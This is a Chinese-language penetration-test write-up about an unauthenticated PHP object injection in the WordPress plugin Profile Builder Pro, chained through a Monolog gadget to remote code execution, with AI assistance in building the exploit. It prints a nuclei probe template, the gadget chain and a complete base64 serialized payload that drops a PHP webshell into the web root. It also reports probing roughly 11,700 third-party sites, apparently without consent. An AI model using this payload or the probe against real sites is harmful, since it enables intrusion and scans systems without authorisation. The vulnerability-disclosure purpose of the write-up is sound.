#  一次渗透测试纪实：利用 AI 发掘 Profile Builder Pro 插件 PHP 对象注入漏洞  
 幻泉之洲   2026-03-24 01:18  
  
> 本文详尽分析了 WordPress 插件 Profile Builder Pro (版本 ≤3.14.5) 中存在的一个未授权 PHP 对象注入漏洞。结合 AI 工具进行代码审计，我们发现并利用了一个存在于『The Events Calendar』插件中的新型 Monolog POP 链，成功实现远程代码执行。整个过程，从漏洞发现到编写有效的攻击载荷，耗时仅数小时。  
  
## 漏洞概况  
- **产品：Profile Builder Pro (https://www.cozmoslabs.com/wordpress-profile-builder/)**  
- **厂商：Cozmoslabs (https://www.cozmoslabs.com/)**  
- **受影响版本：3.14.5 及以下**  
- **首次修复版本：3.14.6******  
- **漏洞危害：攻击者可在未授权的情况下注入恶意 PHP 对象并触发反序列化。结合站点中其他插件存在的“小工具”（Gadget）链，最终可导致远程代码执行。在我们的案例中，利用了 The Events Calendar 插件的 Monolog 组件实现攻击。**  
## 发现之旅：从一个平淡无奇的客户站点开始  
  
那是一次常规的渗透测试。客户的 WordPress 站点看起来防护得不错：核心版本最新、XMLRPC 接口有保护、REST API 没暴露什么敏感信息、所有插件也都更新了。只发现一个存储型 XSS，但需要编辑权限才能利用。  
  
如果按部就班，或许写份报告就结束了。但我们没这么做。  
  
我们决定，对站点上安装的二十多个插件，从非认证用户和订阅者权限的视角，进行一次彻底的攻击面分析。  
  
semgrep --dataflow-traces --force-color   
  
  --text-output=scans/$(date +"%Y%m%d%H%M%S").txt   
  
  --sarif-output=scans/$(date +"%Y%m%d%H%M%S").sarif   
  
  --no-git-ignore  
  
  --config /opt/SAST/semgrep-rules/php/wordpress-plugins/security/audit  
  
在 semgrep 扫描产生的大量结果中，我们最终锁定了一个反序列化缺陷，以及可能利用它所需的小工具。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfNXmgcySSpBOpGHHak4umcWGhojhIEempNMSAIyFv5f0TSibFPC0PLp7HlicRAHK6Nial0reWsFciaMpGictdBVCVfp6VyolCryBpI/640?wx_fmt=png&from=appmsg "")  
## 漏洞原理浅析  
  
不安全的反序列化漏洞（https://portswigger.net/web-security/deserialization）发生在应用程序接收不受信任的序列化数据，并在未充分验证的情况下将其转换回对象时。攻击者可以操纵数据流，注入恶意对象，最终可能导致远程代码执行、权限提升或拒绝服务。  
  
简单理解就是：  
- **序列化：把对象状态（属性和逻辑）变成字节流，方便存储或传输。**  
- **反序列化：把字节流还原成内存中的对象。**  
漏洞的根源在于程序过于信任输入的字节流。攻击者可以构造一个负载，定义非预期的对象类型或修改现有对象的属性，目的是注入一个能触发“小工具链”的对象，从而执行危险操作。  
  
初步确认漏洞后，我们还从 PwnPress（https://pwnpress.io/）的数据中提取了所有使用 Profile Builder 基本版的站点，大约 13600 个。剔除无响应或报错的，剩下约 11700 个。我们向这些站点发送了探测请求。  
  
id: wp-php-object-injection-wppb-args  
  
  
info:  
  
  name: WPPB Admin AJAX - PHP Object Injection via args Parameter  
  
  author: 0xbro  
  
  severity: high  
  
  description: Detects unsafe PHP object deserialization in the Profile Builder (WPPB) plugin via the `args` parameter in admin-ajax.php.  
  
  tags: wordpress，php-object-injection，wppb，deserialization，ajax  
  
  
requests:  
  
  - raw:  
  
      - |  
  
        POST /wp-admin/admin-ajax.php HTTP/1.1  
  
        Host: {{Hostname}}  
  
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
  
        X-Requested-With: XMLHttpRequest  
  
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36  
  
  
        action=wppb_request_users_pins&formid=42&page=1&totalpages=3&ititems=50&args=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A10%3A%22nuclei-poi%22%3B%7D  
  
结果有点令人“失望”（从攻击研究者的角度看）。11700 个站点里，大约 1590 个存在漏洞，占比约 13.59%。  
## 漏洞根因与利用分析  
### 漏洞代码位置  
  
...  
  
add_action( &#x27;wp_ajax_wppb_request_users_pins&#x27;, &#x27;wppb_request_users_pins_action_callback&#x27; );  
  
add_action( &#x27;wp_ajax_nopriv_wppb_request_users_pins&#x27;, &#x27;wppb_request_users_pins_action_callback&#x27; );  
  
...  
  
上面的代码位于wp-content/plugins/profile-builder-pro/add-ons/user-listing/one-map-listing.php  
。关键点在于，它同时为认证和非认证用户注册了同一个 AJAX 动作回调函数。  
### 核心问题函数  
  
function wppb_request_users_pins_action_callback() {  
  
	$form_id = filter_input( INPUT_POST, &#x27;formid&#x27;, FILTER_VALIDATE_INT );  
  
	$page    = filter_input( INPUT_POST, &#x27;page&#x27;, FILTER_VALIDATE_INT );  
  
	$args    = filter_input( INPUT_POST, &#x27;args&#x27;, FILTER_DEFAULT ); // [1]  
  
	$args    = maybe_unserialize( $args ); // [2]  
  
	$total_p = filter_input( INPUT_POST, &#x27;totalpages&#x27;, FILTER_VALIDATE_INT );  
  
	$ititems = filter_input( INPUT_POST, &#x27;ititems&#x27;, FILTER_VALIDATE_INT );  
  
...  
  
filter_input  
 取得 args  
 参数，然后直接传给 maybe_unserialize  
 进行处理。  
  
function maybe_unserialize( $data ) {  
  
  if ( is_serialized( $data ) ) { // Don&#x27;t attempt to unserialize data that wasn&#x27;t serialized going in.  
  
		return @unserialize( trim( $data ) );  
  
	}  
  
	return $data;  
  
}  
  
所以，任何能访问网站的人，都可以通过发送一个特定的 POST 请求来注入任意对象。  
  
POST /wp-admin/admin-ajax.php HTTP/2  
  
Host: example.com  
  
...  
  
  
action=wppb_request_users_pins&formid=42&page=1&totalpages=3&ititems=50&args=[SERIALIZED-OBJECT-HERE]  
## 寻找致命一击：POP 链的曲折构建  
  
找到注入点不算难，难的是如何利用它做点“有用”的事。这时我们需要一个 POP 链。  
### 尝试#1：Guzzle 文件写入（失败）  
  
我们首先在 wpvivid-backupstore 插件里找到一个已知的 Guzzle FileCookieJar::__destruct  
 写文件小工具。看起来很美，但当我们把对象反序列化出来时，PHP 报错了：  
> PHP message: PHP Fatal error: Uncaught Error: Cannot use object of type __PHP_Incomplete_Class as array in ...  
  
  
原因是，在反序列化那一刻， FileCookieJar  
 类还没被加载到内存里，也没有已注册的自动加载器会在这个环节把它引进来。这条路走不通。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibfy47EDib9IS4v1eDnr8SxOBViaws7dCAzLNVTjlNO6J1KiaL9kZIWiab5BtwNibE1mT4UIRm3SuNoGuAaNDDmgLav7Yp070ffBFYYs/640?wx_fmt=png&from=appmsg "")  
### 尝试#2：新型 Monolog RCE 链（成功！）  
  
第一次尝试失败后，我们决定请出“重型武器”——Claude Code。面对海量的潜在攻击面，我们将 LLM 分析与手动代码审查结合，大大加速了研究过程。  
  
我们让 Claude 搜索每个已安装插件中可能的小工具。几轮调试和几分钟等待后，我们得到一份可能的小工具列表及其技术分析。这其中有一个假阳性，一个是我们上面试过的 Guzzle 链，另一个，则是 The Events Calendar 插件中一个新型的 Monolog POP 链变种。后来我们发现，这个链也被用在 CVE-2024-8016（https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/events-calendar-pro/the-events-calendar-pro-702-authenticated-administrator-php-object-injection-to-remote-code-execution）里。  
  
Claude 的报告画出了链条：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibfbdicUZOQeneEXm4vqDrgaLB4dfScJ8GEjhNaSPlbiafhRvo4h0icFgCLvEkQ8xz8lUaI7UwKAHVyRSNV2BHKx5MfiaibHiayiblv9rY/640?wx_fmt=png&from=appmsg "")  
  
简单来说，这是一条利用 Monolog 组件，最终通过 proc_open  
 执行任意命令的链式调用。具体过程如下：  
  
1. **入口点**  
：任何继承 Monolog\Handler\Handler  
 并带有 __destruct  
 方法的类。在这里我们选择了 FingersCrossedHandler  
。  
  
2. 当对象被销毁时，触发 __destruct  
 ->close()  
 ->flushBuffer()  
。  
  
3. flushBuffer()  
 内部会调用 getHandler(...)->handleBatch($this->buffer)  
。  
  
4. 如果我们能让 getHandler()  
 返回一个我们控制的 ProcessHandler  
 对象。  
  
5. 那么就能调用到 ProcessHandler::handleBatch  
，进而调用到 AbstractProcessingHandler::handle  
。  
  
6. handle  
 方法会调用 write  
，write  
 会调用 ensureProcessIsStarted  
。  
  
7. startProcess  
 方法最终执行了 proc_open($this->command, ...)  
，$this->command  
 完全由我们控制。  
  
幸运的是，The Events Calendar 插件的自动加载器会在每次 HTTP 请求时被包含进来，这意味着我们可以反序列化 TEC\Common  
 命名空间下的对象而不用担心类未定义。  
  
我们用 grep 命令确认了哪些类有未受保护的 __destruct  
 方法，并排除了有 BadMethodCallException  
 保护的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6TibeORtCgk3nRNfZAgfgxdLc0GeiarFph8icmibDuvOTXZTEaTW03XqfVPrW2Vh5dPWuFINSW6Z1Wz75NiabawwibxASNjkibJTKvWGwWA/640?wx_fmt=png&from=appmsg "")  
## 概念验证（PoC）开发  
  
我们让 Claude 帮忙开发 PoC。它选择了一种“独特”的方式：手动拼接序列化字符串的每一部分，并仔细计算每个部分的字符数。虽然方法有点原始，但奏效了。  
> 说实话，Claude 生成 PoC 的方式有点笨拙，但重点是它能用。  
  
  
下图是执行前网站根目录的文件列表：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibf5ZdvfUNBFDoK9x9OFkmKG6ScjwvNYyicrhu4MkPv79lbDwkAbydA4arvuAjvswhPshJ6yHTUyKxicVtsHWcwmqIDMrWUprFzT8/640?wx_fmt=png&from=appmsg "")  
  
生成的 PoC 输出是 Base64 编码的，用于在 Burp Suite 中发送时不丢失空字节：  
  
$ php poc.php   
  
[*] Base64 (reference):  
  
Tzo0ODoiVEVDXENvbW1vblxNb25vbG9nXEhhbmRsZXJcRmluZ2Vyc0Nyb3NzZWRIYW5kbGVyIjo5OntzOjEwOiIAKgBoYW5kbGVyIjtPOjQxOiJURUNcQ29tbW9uXE1vbm9sb2dcSGFuZGxlclxQcm9jZXNzSGFuZGxlciI6ODp7czo1MDoiAFRFQ1xDb21tb25cTW9ub2xvZ1xIYW5kbGVyXFByb2Nlc3NIYW5kbGVyAGNvbW1hbmQiO3M6NzU6ImVjaG8gUEQ5d2FIQWdjM2x6ZEdWdEtDUmZSMFZVV3pCZEtUc2dQejQ9fGJhc2U2NCAtZD4vdmFyL3d3dy9odG1sLzB4YnJvLnBocCI7czo1MDoiAFRFQ1xDb21tb25cTW9ub2xvZ1xIYW5kbGVyXFByb2Nlc3NIYW5kbGVyAHByb2Nlc3MiO047czo0ODoiAFRFQ1xDb21tb25cTW9ub2xvZ1xIYW5kbGVyXFByb2Nlc3NIYW5kbGVyAHBpcGVzIjthOjA6e31zOjQ2OiIAVEVDXENvbW1vblxNb25vbG9nXEhhbmRsZXJcUHJvY2Vzc0hhbmRsZXIAY3dkIjtOO3M6ODoiACoAbGV2ZWwiO2k6MTAwO3M6OToiACoAYnViYmxlIjtiOjE7czoxMjoiACoAZm9ybWF0dGVyIjtOO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6MDp7fX1zOjIxOiIAKgBhY3RpdmF0aW9uU3RyYXRlZ3kiO047czoxMjoiACoAYnVmZmVyaW5nIjtiOjE7czoxMzoiACoAYnVmZmVyU2l6ZSI7aTowO3M6OToiACoAYnVmZmVyIjthOjE6e2k6MDthOjc6e3M6NzoibWVzc2FnZSI7czoxOiJ4IjtzOjc6ImNvbnRleHQiO2E6MDp7fXM6NToibGV2ZWwiO2k6NTAwO3M6MTA6ImxldmVsX25hbWUiO3M6ODoiQ1JJVElDQUwiO3M6NzoiY2hhbm5lbCI7czozOiJhcHAiO3M6ODoiZGF0ZXRpbWUiO086MTc6IkRhdGVUaW1lSW1tdXRhYmxlIjozOntzOjQ6ImRhdGUiO3M6MjY6IjIwMjQtMDEtMDEgMDA6MDA6MDAuMDAwMDAwIjtzOjEzOiJ0aW1lem9uZV90eXBlIjtpOjM7czo4OiJ0aW1lem9uZSI7czozOiJVVEMiO31zOjU6ImV4dHJhIjthamAwOnt9fX1zOjE2OiIAKgBzdG9wQnVmZmVyaW5nIjtiOjE7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTo1MDA7czo5OiIAKgBidWJibGUiO2I6MTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjA6e319  
  
把这段 Payload 通过 HTTP 请求发送到目标站点的 admin-ajax.php  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibeA8micicictTs2Q7NhzTAVl9lGAyxfMynBsqHXOFOAWrI5A9LMJ3JlmicEQTCG7NzDibSE3ooshtLCkk1w5TyUtKVsjsPF8czGlBoY/640?wx_fmt=png&from=appmsg "")  
  
反序列化操作成功执行了我们构造的命令，在服务器上生成了一个 WebShell 文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/tbTbtBE6Tibee18WWa25MHWENj0PuE5Q0WGogzzKhqjWaicts1E8HhPGT4jrUHueqvxr4Nx1eQV1DkAlG0xJaic511hbWK5icTIfN18snb2cazA/640?wx_fmt=png&from=appmsg "")  
  
当然，更优雅的方式是使用现成的工具链，比如 PHPGGC。这个新型的 Monolog 链（我们暂且称之为 RCE10）也已提交并可能被收录。  
## 总结与思考  
  
AI 从源代码中识别漏洞的能力，在这篇文章中得到了充分体现。以前可能要花几天时间寻找一条新的 POP 链，而现在，结合传统的 SAST 工具，我们可以在几小时内完成漏洞发现、小工具检索和 PoC 开发。  
  
当然，最大的挑战在于如何分辨假阳性，以及如何引导 LLM 聚焦于我们真正关心的问题。但这次研究证实，LLM 分析结合传统审计工具，效率是指数级提升的，而且确实能发现之前未被察觉的漏洞变种。  
  
这个案例也告诉我们，仅仅保持 WordPress 核心和插件最新只是安全的基础线。真正的安全风险，往往隐藏在自定义代码和第三方依赖之间复杂的、非显而易见的攻击链里。更新插件固然重要，但深度安全审计的价值，在于发现和阻断这些隐藏的威胁路径。  
  
